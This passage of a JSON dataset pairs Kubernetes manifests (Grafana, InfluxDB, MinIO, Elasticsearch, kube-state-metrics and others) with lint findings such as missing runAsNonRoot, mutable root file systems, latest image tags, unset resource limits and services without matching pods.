- name: grafana-persistent-storage\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"influxdb\" does not have a read-only root file system"
  },
  {
    "id": "8618",
    "manifest_path": "data/manifests/the_stack_sample/sample_3223.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-influxdb-grafana-v4\n  namespace: kube-system\n  labels:\n    k8s-app: influxGrafana\n    version: v4\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: influxGrafana\n    version: v4\n  template:\n    metadata:\n      labels:\n        k8s-app: influxGrafana\n        version: v4\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: hub.docker.vpclub.cn/vpclub_containers/heapster_influxdb:v0.7\n        name: influxdb\n        resources:\n          limits:\n            cpu: 100m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 500Mi\n        ports:\n        - containerPort: 8083\n        - containerPort: 8086\n        volumeMounts:\n        - name: influxdb-persistent-storage\n          mountPath: /data\n      - image: hub.docker.vpclub.cn/vpclub_containers/heapster_grafana:v2.6.0-2\n        name: grafana\n        env:\n        - name: INFLUXDB_SERVICE_URL\n          value: http://monitoring-influxdb:8086\n        - name: GF_AUTH_BASIC_ENABLED\n          value: 'false'\n        - name: GF_AUTH_ANONYMOUS_ENABLED\n          value: 'true'\n        - name: GF_AUTH_ANONYMOUS_ORG_ROLE\n          value: Admin\n        - name: GF_SERVER_ROOT_URL\n          value: /api/v1/proxy/namespaces/kube-system/services/monitoring-grafana/\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: grafana-persistent-storage\n          mountPath: /var\n      volumes:\n      - name: influxdb-persistent-storage\n        emptyDir: {}\n      - name: grafana-persistent-storage\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"grafana\" is not set to runAsNonRoot"
  },
  {
    "id": "8619",
    "manifest_path": "data/manifests/the_stack_sample/sample_3223.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-influxdb-grafana-v4\n  namespace: kube-system\n  labels:\n    k8s-app: influxGrafana\n    version: v4\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: influxGrafana\n    version: v4\n  template:\n    metadata:\n      labels:\n        k8s-app: influxGrafana\n        version: v4\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: hub.docker.vpclub.cn/vpclub_containers/heapster_influxdb:v0.7\n        name: influxdb\n        resources:\n          limits:\n            cpu: 100m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 500Mi\n        ports:\n        - containerPort: 8083\n        - containerPort: 8086\n        volumeMounts:\n        - name: influxdb-persistent-storage\n          mountPath: /data\n      - image: hub.docker.vpclub.cn/vpclub_containers/heapster_grafana:v2.6.0-2\n        name: grafana\n        env:\n        - name: INFLUXDB_SERVICE_URL\n          value: http://monitoring-influxdb:8086\n        - name: GF_AUTH_BASIC_ENABLED\n          value: 'false'\n        - name: GF_AUTH_ANONYMOUS_ENABLED\n          value: 'true'\n        - name: GF_AUTH_ANONYMOUS_ORG_ROLE\n          value: Admin\n        - name: GF_SERVER_ROOT_URL\n          value: /api/v1/proxy/namespaces/kube-system/services/monitoring-grafana/\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: grafana-persistent-storage\n          mountPath: /var\n      volumes:\n      - name: influxdb-persistent-storage\n        emptyDir: {}\n      - name: grafana-persistent-storage\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"influxdb\" is not set to runAsNonRoot"
  },
  {
    "id": "8620",
    "manifest_path": "data/manifests/the_stack_sample/sample_3225.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n  selector:\n    name: nginx\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:nginx])"
  },
  {
    "id": "8621",
    "manifest_path": "data/manifests/the_stack_sample/sample_3226.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        envFrom:\n        - prefix: MINIO_\n          secretRef:\n            name: minio-secret\n        image: minio/minio:RELEASE.2019-07-10T00-34-56Z\n        args:\n        - server\n        - /data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio\" does not have a read-only root file system"
  },
  {
    "id": "8622",
    "manifest_path": "data/manifests/the_stack_sample/sample_3226.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        envFrom:\n        - prefix: MINIO_\n          secretRef:\n            name: minio-secret\n        image: minio/minio:RELEASE.2019-07-10T00-34-56Z\n        args:\n        - server\n        - /data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"minio\" is not set to runAsNonRoot"
  },
  {
    "id": "8623",
    "manifest_path": "data/manifests/the_stack_sample/sample_3226.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        envFrom:\n        - prefix: MINIO_\n          secretRef:\n            name: minio-secret\n        image: minio/minio:RELEASE.2019-07-10T00-34-56Z\n        args:\n        - server\n        - /data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"minio\" has cpu request 0"
  },
  {
    "id": "8624",
    "manifest_path": "data/manifests/the_stack_sample/sample_3226.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        envFrom:\n        - prefix: MINIO_\n          secretRef:\n            name: minio-secret\n        image: minio/minio:RELEASE.2019-07-10T00-34-56Z\n        args:\n        - server\n        - /data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio\" has memory limit 0"
  },
  {
    "id": "8625",
    "manifest_path": "data/manifests/the_stack_sample/sample_3228.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: ec2-discovery\nspec:\n  containers:\n  - name: ec2-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,EC2\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ec2-discovery-skaffold\" is using an invalid container image, \"docker.openraven.io/open/aws-discovery:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8626",
    "manifest_path": "data/manifests/the_stack_sample/sample_3228.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: ec2-discovery\nspec:\n  containers:\n  - name: ec2-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,EC2\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ec2-discovery-skaffold\" does not have a read-only root file system"
  },
  {
    "id": "8627",
    "manifest_path": "data/manifests/the_stack_sample/sample_3228.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: ec2-discovery\nspec:\n  containers:\n  - name: ec2-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,EC2\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ec2-discovery-skaffold\" is not set to runAsNonRoot"
  },
  {
    "id": "8628",
    "manifest_path": "data/manifests/the_stack_sample/sample_3228.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: ec2-discovery\nspec:\n  containers:\n  - name: ec2-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,EC2\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ec2-discovery-skaffold\" has cpu request 0"
  },
  {
    "id": "8629",
    "manifest_path": "data/manifests/the_stack_sample/sample_3228.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: ec2-discovery\nspec:\n  containers:\n  - name: ec2-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,EC2\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ec2-discovery-skaffold\" has memory limit 0"
  },
  {
    "id": "8630",
    "manifest_path": "data/manifests/the_stack_sample/sample_3229.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: postgres-service\n  namespace: bookstore\n  labels:\n    app: postgres\nspec:\n  ports:\n  - port: 5432\n    name: postgres\n  type: NodePort\n  selector:\n    app: postgres\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:postgres])"
  },
  {
    "id": "8631",
    "manifest_path": "data/manifests/the_stack_sample/sample_3231.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ibm-healthcheck-operator\n  labels:\n    app.kubernetes.io/instance: ibm-healthcheck-operator\n    app.kubernetes.io/managed-by: ibm-healthcheck-operator\n    app.kubernetes.io/name: ibm-healthcheck-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: ibm-healthcheck-operator\n  template:\n    metadata:\n      labels:\n        name: ibm-healthcheck-operator\n        app.kubernetes.io/instance: ibm-healthcheck-operator\n        app.kubernetes.io/managed-by: ibm-healthcheck-operator\n        app.kubernetes.io/name: ibm-healthcheck-operator\n      annotations:\n        productName: IBM Cloud Platform Common Services\n        productID: 068a62892a1e4db39641342e592daa25\n        productMetric: FREE\n    spec:\n      serviceAccountName: ibm-healthcheck-operator\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n                - ppc64le\n                - s390x\n      containers:\n      - name: ibm-healthcheck-operator\n        image: quay.io/opencloudio/ibm-healthcheck-operator:3.11.0\n        command:\n        - ibm-healthcheck-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: ibm-healthcheck-operator\n        - name: SYSTEM_HEALTHCHECK_SERVICE_IMAGE\n          value: quay.io/opencloudio/system-healthcheck-service:3.9.2\n        - name: ICP_MEMCACHED_IMAGE\n          value: quay.io/opencloudio/icp-memcached:3.9.1\n        - name: MUST_GATHER_IMAGE\n          value: quay.io/opencloudio/must-gather:4.5.6\n        - name: MUST_GATHER_SERVICE_IMAGE\n          value: quay.io/opencloudio/must-gather-service:1.2.4\n        resources:\n          limits:\n            cpu: 160m\n            memory: 512Mi\n          requests:\n            cpu: 10m\n            memory: 32Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"ibm-healthcheck-operator\" not found"
  },
  {
    "id": "8632",
    "manifest_path": "data/manifests/the_stack_sample/sample_3232.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: docs\n  name: docs\nspec:\n  selector:\n    app: docs\n  type: ClusterIP\n  ports:\n  - name: docs\n    port: 80\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:docs])"
  },
  {
    "id": "8633",
    "manifest_path": "data/manifests/the_stack_sample/sample_3234.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: stack-deploy-worker-squad1\n  labels:\n    name: stack-deploy-worker-squad1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: stack-deploy-worker-squad1\n  template:\n    metadata:\n      labels:\n        name: stack-deploy-worker-squad1\n    spec:\n      containers:\n      - name: stack-deploy-worker-squad1\n        image: d10s0vsky/sld-api:latest\n        imagePullPolicy: Always\n        env:\n        - name: TF_WARN_OUTPUT_ERRORS\n          value: '1'\n        resources:\n          limits:\n            memory: 600Mi\n            cpu: 1\n          requests:\n            memory: 300Mi\n            cpu: 500m\n        command:\n        - celery\n        - --app\n        - tasks.celery_worker\n        - worker\n        - --loglevel=info\n        - -c\n        - '1'\n        - -E\n        - -Q\n        - squad1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"stack-deploy-worker-squad1\" is using an invalid container image, \"d10s0vsky/sld-api:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8634",
    "manifest_path": "data/manifests/the_stack_sample/sample_3234.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: stack-deploy-worker-squad1\n  labels:\n    name: stack-deploy-worker-squad1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: stack-deploy-worker-squad1\n  template:\n    metadata:\n      labels:\n        name: stack-deploy-worker-squad1\n    spec:\n      containers:\n      - name: stack-deploy-worker-squad1\n        image: d10s0vsky/sld-api:latest\n        imagePullPolicy: Always\n        env:\n        - name: TF_WARN_OUTPUT_ERRORS\n          value: '1'\n        resources:\n          limits:\n            memory: 600Mi\n            cpu: 1\n          requests:\n            memory: 300Mi\n            cpu: 500m\n        command:\n        - celery\n        - --app\n        - tasks.celery_worker\n        - worker\n        - --loglevel=info\n        - -c\n        - '1'\n        - -E\n        - -Q\n        - squad1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"stack-deploy-worker-squad1\" does not have a read-only root file system"
  },
  {
    "id": "8635",
    "manifest_path": "data/manifests/the_stack_sample/sample_3234.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: stack-deploy-worker-squad1\n  labels:\n    name: stack-deploy-worker-squad1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: stack-deploy-worker-squad1\n  template:\n    metadata:\n      labels:\n        name: stack-deploy-worker-squad1\n    spec:\n      containers:\n      - name: stack-deploy-worker-squad1\n        image: d10s0vsky/sld-api:latest\n        imagePullPolicy: Always\n        env:\n        - name: TF_WARN_OUTPUT_ERRORS\n          value: '1'\n        resources:\n          limits:\n            memory: 600Mi\n            cpu: 1\n          requests:\n            memory: 300Mi\n            cpu: 500m\n        command:\n        - celery\n        - --app\n        - tasks.celery_worker\n        - worker\n        - --loglevel=info\n        - -c\n        - '1'\n        - -E\n        - -Q\n        - squad1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"stack-deploy-worker-squad1\" is not set to runAsNonRoot"
  },
  {
    "id": "8636",
    "manifest_path": "data/manifests/the_stack_sample/sample_3237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: elasticsearch\n  labels:\n    app: elasticsearch\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n    spec:\n      containers:\n      - name: elasticsearch\n        image: elasticsearch:7.16.2\n        env:\n        - name: ES_JAVA_OPTS\n          value: -Xmx256m -Xms256m\n        - name: discovery.type\n          value: single-node\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        resources: {}\n        volumeMounts:\n        - mountPath: /usr/share/elasticsearch/data\n          name: elasticsearch\n      volumes:\n      - name: elasticsearch\n        hostPath:\n          path: /var/k8s/volumes/default/elasticsearch\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"elasticsearch\" does not have a read-only root file system"
  },
  {
    "id": "8637",
    "manifest_path": "data/manifests/the_stack_sample/sample_3237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: elasticsearch\n  labels:\n    app: elasticsearch\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n    spec:\n      containers:\n      - name: elasticsearch\n        image: elasticsearch:7.16.2\n        env:\n        - name: ES_JAVA_OPTS\n          value: -Xmx256m -Xms256m\n        - name: discovery.type\n          value: single-node\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        resources: {}\n        volumeMounts:\n        - mountPath: /usr/share/elasticsearch/data\n          name: elasticsearch\n      volumes:\n      - name: elasticsearch\n        hostPath:\n          path: /var/k8s/volumes/default/elasticsearch\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"elasticsearch\" is not set to runAsNonRoot"
  },
  {
    "id": "8638",
    "manifest_path": "data/manifests/the_stack_sample/sample_3237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: elasticsearch\n  labels:\n    app: elasticsearch\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n    spec:\n      containers:\n      - name: elasticsearch\n        image: elasticsearch:7.16.2\n        env:\n        - name: ES_JAVA_OPTS\n          value: -Xmx256m -Xms256m\n        - name: discovery.type\n          value: single-node\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        resources: {}\n        volumeMounts:\n        - mountPath: /usr/share/elasticsearch/data\n          name: elasticsearch\n      volumes:\n      - name: elasticsearch\n        hostPath:\n          path: /var/k8s/volumes/default/elasticsearch\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"elasticsearch\" has cpu request 0"
  },
  {
    "id": "8639",
    "manifest_path": "data/manifests/the_stack_sample/sample_3237.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: elasticsearch\n  labels:\n    app: elasticsearch\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n    spec:\n      containers:\n      - name: elasticsearch\n        image: elasticsearch:7.16.2\n        env:\n        - name: ES_JAVA_OPTS\n          value: -Xmx256m -Xms256m\n        - name: discovery.type\n          value: single-node\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        resources: {}\n        volumeMounts:\n        - mountPath: /usr/share/elasticsearch/data\n          name: elasticsearch\n      volumes:\n      - name: elasticsearch\n        hostPath:\n          path: /var/k8s/volumes/default/elasticsearch\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"elasticsearch\" has memory limit 0"
  },
  {
    "id": "8640",
    "manifest_path": "data/manifests/the_stack_sample/sample_3238.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: psiappsvc\nspec:\n  selector:\n    app: dev-msauth\n    environment: dev\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:dev-msauth environment:dev])"
  },
  {
    "id": "8641",
    "manifest_path": "data/manifests/the_stack_sample/sample_3242.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: query-frontend\n    app.kubernetes.io/instance: RELEASE-NAME\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/name: tempo-distributed\n    app.kubernetes.io/version: 1.3.0\n    helm.sh/chart: tempo-distributed-0.15.1\n  name: RELEASE-NAME-tempo-distributed-query-frontend-discovery\n  namespace: default\nspec:\n  clusterIP: None\n  ports:\n  - name: http\n    port: 3100\n    targetPort: 3100\n  - name: grpc\n    port: 9095\n    protocol: TCP\n    targetPort: 9095\n  - name: tempo-query-jaeger-ui\n    port: 16686\n    targetPort: 16686\n  - name: tempo-query-metrics\n    port: 16687\n    targetPort: jaeger-metrics\n  selector:\n    app.kubernetes.io/component: query-frontend\n    app.kubernetes.io/instance: RELEASE-NAME\n    app.kubernetes.io/name: tempo-distributed\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:query-frontend app.kubernetes.io/instance:RELEASE-NAME app.kubernetes.io/name:tempo-distributed])"
  },
  {
    "id": "8642",
    "manifest_path": "data/manifests/the_stack_sample/sample_3247.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: kube-prometheus\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: kube-prometheus\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: kube-prometheus\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: harbor.chanty.21vianet.com/library/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          limits:\n            cpu: 100m\n            memory: 250Mi\n          requests:\n            cpu: 10m\n            memory: 190Mi\n        securityContext:\n          runAsUser: 65534\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        image: harbor.chanty.21vianet.com/library/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          limits:\n            cpu: 40m\n            memory: 40Mi\n          requests:\n            cpu: 20m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        image: harbor.chanty.21vianet.com/library/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          limits:\n            cpu: 20m\n            memory: 40Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-rbac-proxy-main\" does not have a read-only root file system"
  },
  {
    "id": "8643",
    "manifest_path": "data/manifests/the_stack_sample/sample_3247.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: kube-prometheus\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: kube-prometheus\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: kube-prometheus\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: harbor.chanty.21vianet.com/library/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          limits:\n            cpu: 100m\n            memory: 250Mi\n          requests:\n            cpu: 10m\n            memory: 190Mi\n        securityContext:\n          runAsUser: 65534\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        image: harbor.chanty.21vianet.com/library/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          limits:\n            cpu: 40m\n            memory: 40Mi\n          requests:\n            cpu: 20m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        image: harbor.chanty.21vianet.com/library/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          limits:\n            cpu: 20m\n            memory: 40Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-rbac-proxy-self\" does not have a read-only root file system"
  },
  {
    "id": "8644",
    "manifest_path": "data/manifests/the_stack_sample/sample_3247.yaml",
